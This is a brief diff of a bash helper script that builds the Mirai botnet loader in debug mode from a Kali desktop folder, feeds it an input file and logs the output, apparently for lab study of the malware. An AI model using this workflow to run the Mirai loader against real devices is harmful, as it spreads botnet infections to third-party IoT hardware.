@@ -1,5 +1,10 @@
 #!/bin/bash
-cd /home/kali/Desktop/myMirai/MiraiSourceCode/loader
+
+# setting path to Mirai source Folder
+pathToMirai=/home/kali/Desktop/myMirai/MiraiSourceCode
+export pathToMirai
+
+cd $pathToMirai/loader
 sudo bash ./build.debug.sh &> /dev/null
 cat ./file.txt | ./loader.dbg | tee /home/kali/Desktop/outputDBG.txt
 printf "\n\n"
